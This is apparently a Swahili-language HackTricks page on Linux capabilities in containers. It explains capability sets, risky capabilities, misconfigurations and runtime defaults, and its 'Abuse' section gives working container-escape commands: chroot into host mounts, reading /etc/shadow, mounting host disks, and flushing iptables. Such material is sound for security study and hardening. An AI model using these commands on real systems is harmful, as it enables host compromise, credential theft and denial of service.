# Uwezo za Linux katika Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

Linux capabilities ni mojawapo ya vipengele muhimu kabisa vya usalama wa container kwa sababu zinajibu swali nyeti lakini la msingi: **"root" ina maana gani kweli ndani ya container?** Kwenye mfumo wa kawaida wa Linux, UID 0 kihistoria ilimaanisha seti pana ya vibali. Katika kernels za kisasa, kibali hicho kimegawanywa kuwa vitengo vidogo vinavyoitwa capabilities. Mchakato unaweza kuendeshwa kama root na bado kukosa operesheni nyingi zenye nguvu ikiwa capabilities husika zimeondolewa.

Containers zinategemea tofauti hii kwa kiasi kikubwa. Mizigo ya kazi mingi bado huanzishwa kama UID 0 ndani ya container kwa sababu za urahisi au ulinganifu. Bila kuondoa capabilities, hiyo ingekuwa hatari sana. Kwa kuondoa capabilities, mchakato wa root ndani ya container bado unaweza kutekeleza kazi nyingi za kawaida ndani ya container huku ukikamatwa kuweza kufanya operesheni nyeti za kernel. Ndiyo sababu shell ya container inayosema `uid=0(root)` haimaanishi moja kwa moja "host root" au hata "broad kernel privilege". Sets za capability zinaamua thamani halisi ya utambulisho huo wa root.

For the full Linux capability reference and many abuse examples, see:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Uendeshaji

Capabilities zinafuatiliwa katika seti kadhaa, zikiwemo permitted, effective, inheritable, ambient, na bounding sets. Kwa tathmini nyingi za container, semantiki kamili za kernel za kila seti si za muhimu mara moja kama swali la vitendo linalofuata: **ni operesheni zipi zilizo za kivyeti ambazo mchakato huu unaweza kuzitekeleza kwa mafanikio sasa hivi, na upatikanaji gani wa vibali baadaye bado ni uwezekano?**

Sababu ni kwamba mbinu nyingi za breakout kwa hakika ni matatizo ya capabilities yaliyofunikwa kama matatizo ya container. Workload yenye `CAP_SYS_ADMIN` inaweza kufikia kiasi kikubwa cha uwezo wa kernel ambacho mchakato wa root wa container kawaida haipaswi kugusa. Workload yenye `CAP_NET_ADMIN` inakuwa hatari zaidi ikiwa pia inashiriki host network namespace. Workload yenye `CAP_SYS_PTRACE` inakuwa ya kuvutia zaidi ikiwa inaweza kuona mchakato za host kupitia host PID sharing. Katika Docker au Podman hiyo inaweza kuonekana kama `--pid=host`; katika Kubernetes kawaida inaonekana kama `hostPID: true`.

Kwa maneno mengine, seti ya capabilities haiwezi kutathminiwa peke yake. Inapaswa kusomwa pamoja na namespaces, seccomp, na sera za MAC.

## Maabara

Njia ya moja kwa moja ya kuchunguza capabilities ndani ya container ni:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Unaweza pia kulinganisha container yenye vikwazo zaidi na ile ambayo imeongezwa capabilities zote:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ili kuona athari ya nyongeza ndogo, jaribu kuondoa kila kitu kisha kurejesha capability moja tu:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Majaribio madogo haya yanaonyesha kwamba runtime si tu kubadili boolean iitwayo "privileged". Inaunda uso halisi wa vibali unaopatikana kwa mchakato.

## Capabilities Zenye Hatari Kuu

**`CAP_SYS_ADMIN`** ndiyo wale wanaolinda wanapaswa kuichukulia kwa shaka kubwa zaidi. Mara nyingi huelezewa kama "the new root" kwa sababu inafungua idadi kubwa ya kazi, ikiwa ni pamoja na operesheni zinazohusiana na mount, tabia inayotegemea namespace, na njia nyingi za kernel ambazo hazipaswi kufichuliwa kwa urahisi kwa containers. Ikiwa container ina `CAP_SYS_ADMIN`, seccomp dhaifu, na hakuna kifungwaji kali cha MAC, njia nyingi za breakout za jadi zinakuwa uwezekano mkubwa.

**`CAP_SYS_PTRACE`** ina umuhimu wakati kuna uonekano wa mchakato, hasa ikiwa PID namespace inashirikiwa na host au na workloads zinazovutia jirani. Inaweza kubadilisha uonekano kuwa kuingilia.

**`CAP_NET_ADMIN`** na **`CAP_NET_RAW`** zina umuhimu katika mazingira yanayotegemea mtandao. Katika bridge network iliyotengwa zinaweza tayari kuwa hatari; katika shared host network namespace zinakuwa mbaya zaidi kwa sababu workload inaweza kuweza kurekebisha networking ya host, sniff, spoof, au kuingilia mtiririko wa trafiki wa ndani.

**`CAP_SYS_MODULE`** kwa kawaida ni hatari kali katika mazingira yenye root kwa sababu kupakia kernel modules ni udhibiti wa kernel ya host. Haipaswi kuonekana karibu kamwe katika workload ya container ya matumizi ya jumla.

## Runtime Usage

Docker, Podman, containerd-based stacks, na CRI-O zote zinatumia udhibiti wa capabilities, lakini default na interfaces za usimamizi zinatofautiana. Docker zinaonyesha hilo kwa moja kwa moja kupitia flags kama `--cap-drop` na `--cap-add`. Podman ina udhibiti sawa na mara nyingi inafaidika na execution bila root (rootless) kama safu ya ziada ya usalama. Kubernetes inaonyesha uongezaji na kuondoa capabilities kupitia Pod au container `securityContext`. Mazingira ya system-container kama LXC/Incus pia yanategemea udhibiti wa capabilities, lakini ujumuishaji mpana wa host wa mifumo hiyo mara nyingi huvutia operators kupunguza defaults kwa nguvu zaidi kuliko wangekufanya katika mazingira ya app-container.

Kanuni ile ile inafanya kazi kwao wote: capability ambayo kwa kiufundi inawezekana kupewa si lazima iwe ile inayopaswa kupewa. Tukio nyingi za ulimwengu halisi huanza wakati operator anaongeza capability kwa sababu workload ilishindwa chini ya configuration kali na timu ilihitaji kurekebisha kwa haraka.

## Misconfigurations

Hitilafu dhahiri zaidi ni **`--cap-add=ALL`** katika CLIs za mtindo wa Docker/Podman, lakini si yo yote. Kwa vitendo, tatizo la kawaida ni kutoa uwezo mmoja au wawili wenye nguvu sana, hasa `CAP_SYS_ADMIN`, ili "kufanya application ifanye kazi" bila kuelewa pia athari za namespace, seccomp, na mount. Njia nyingine ya kushindwa mara nyingi ni kuchanganya capabilities za ziada na kushiriki host namespace. Katika Docker au Podman hili linaweza kuonekana kama `--pid=host`, `--network=host`, au `--userns=host`; katika Kubernetes ufichuzi sawa mara nyingi unaonekana kupitia mipangilio ya workload kama `hostPID: true` au `hostNetwork: true`. Kila moja ya mchanganyiko huo hubadilisha kile ability inaweza kuathiri kweli.

Pia ni kawaida kuona wasimamizi wakidhani kwamba kwa sababu workload sio kabisa `--privileged`, bado imezuiliwa kwa maana. Wakati mwingine hilo ni kweli, lakini wakati mwingine msimamo wa ufanisi tayari uko karibu vya kutosha na privileged kiasi kwamba tofauti haioni umuhimu kwa kiutendaji.

## Abuse

Hatua ya kwanza ya vitendo ni kuorodhesha seti ya capabilities inayofanya kazi na kupima mara moja vitendo maalum vya kila capability ambavyo vitakuwa muhimu kwa escape au kupata taarifa za host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Ikiwa `CAP_SYS_ADMIN` ipo, jaribu kwanza mount-based abuse na host filesystem access, kwa sababu hii ni mojawapo ya breakout enablers zinazotumika zaidi:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Ikiwa `CAP_SYS_PTRACE` ipo na container inaweza kuona michakato inayovutia, thibitisha ikiwa uwezo huo unaweza kubadilishwa kuwa uchunguzi wa mchakato:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Ikiwa `CAP_NET_ADMIN` au `CAP_NET_RAW` ipo, jaribu ikiwa workload inaweza kuingilia stack ya mtandao inayoonekana au angalau kukusanya taarifa muhimu za mtandao:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wakati mtihani wa capability unapoelekea mafanikio, uyachanganye na hali ya namespace. Capability ambayo inaonekana hatari tu katika namespace iliyotengwa inaweza mara moja kuwa njia ya escape au primitive ya host-recon wakati container pia inashare host PID, host network, au host mounts.

### Mfano Kamili: `CAP_SYS_ADMIN` + Host Mount = Host Escape

If the container has `CAP_SYS_ADMIN` and a writable bind mount of the host filesystem such as `/host`, the escape path is often straightforward:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Ikiwa `chroot` itafanikiwa, amri sasa zinaendeshwa katika muktadha wa filesystem mzizi ya host:
```bash
id
hostname
cat /etc/shadow | head
```
Ikiwa `chroot` haipatikani, matokeo yanayofanana mara nyingi yanaweza kupatikana kwa kuita binary kupitia mti uliopachikwa:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Mfano Kamili: `CAP_SYS_ADMIN` + Ufikiaji wa Kifaa

Ikiwa block device kutoka kwa host imefunuliwa, `CAP_SYS_ADMIN` inaweza kuibadilisha kuwa ufikiaji wa moja kwa moja wa mfumo wa faili wa host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Mfano Kamili: `CAP_NET_ADMIN` + Host Networking

Mchanganyiko huu hauwezi kila wakati kutoa host root moja kwa moja, lakini unaweza kurekebisha kabisa host network stack:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Hii inaweza kuwezesha denial of service, traffic interception, au access to services ambazo hapo awali zilichujwa.

## Ukaguzi

Lengo la capability checks si tu kutoa raw values, bali kuelewa kama process ina privilege ya kutosha kufanya current namespace na mount situation yake kuwa hatari.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Kinachovutia hapa:

- `capsh --print` ni njia rahisi zaidi ya kubaini capabilities zenye hatari kubwa kama `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, au `cap_sys_module`.
- Mstari wa `CapEff` katika `/proc/self/status` unaonyesha ni nini kinatumika sasa, sio tu kile kinachoweza kuwepo katika sets nyingine.
- Capability dump inakuwa muhimu zaidi ikiwa container pia inashare host PID, network, au user namespaces, au ina host mounts zinazoweza kuandikwa.

Baada ya kukusanya taarifa ghafi za capability, hatua inayofuata ni tafsiri. Jiulize ikiwa mchakato ni root, ikiwa user namespaces zinafanya kazi, ikiwa host namespaces zinashirikiwa, ikiwa seccomp inatekelezwa, na ikiwa AppArmor au SELinux bado vinazuia mchakato. Seti ya capabilities yenyewe ni sehemu tu ya hadithi, lakini mara nyingi ndiyo sehemu inayofafanua kwa nini container breakout moja inafanya kazi na nyingine inashindwa kutoka kwa point ya kuanzia iliyofanana.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhaifu wa kawaida uliofanywa kwa mkono |
| --- | --- | --- | --- |
| Docker Engine | Seti ya capabilities iliyopunguzwa kwa chaguo-msingi | Docker ina orodha ya kuruhusu chaguo-msingi ya capabilities na inaondoa zingine zote | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Seti ya capabilities iliyopunguzwa kwa chaguo-msingi | Containers za Podman hazina privileged kwa chaguo-msingi na zinatumia modeli ya capabilities iliyopunguzwa | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inarithi chaguo-msingi za runtime isipobadilishwa | Ikiwa hakuna `securityContext.capabilities` iliyoelezwa, container hupata seti ya capabilities ya chaguo-msingi kutoka kwa runtime | `securityContext.capabilities.add`, kushindwa `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Kawaida chaguo-msingi za runtime | Seti inayofanya kazi inategemea runtime pamoja na Pod spec | sawa na mzunguko wa Kubernetes; usanidi wa moja kwa moja wa OCI/CRI pia unaweza kuongeza capabilities waziwazi |

Kwa Kubernetes, jambo muhimu ni kwamba API haitiaini seti moja ya chaguo-msingi ya capabilities kwa ujumla. Ikiwa Pod haiongezi wala kuondoa capabilities, workload inarithi chaguo-msingi za runtime kwa node hiyo.
{{#include ../../../../banners/hacktricks-training.md}}
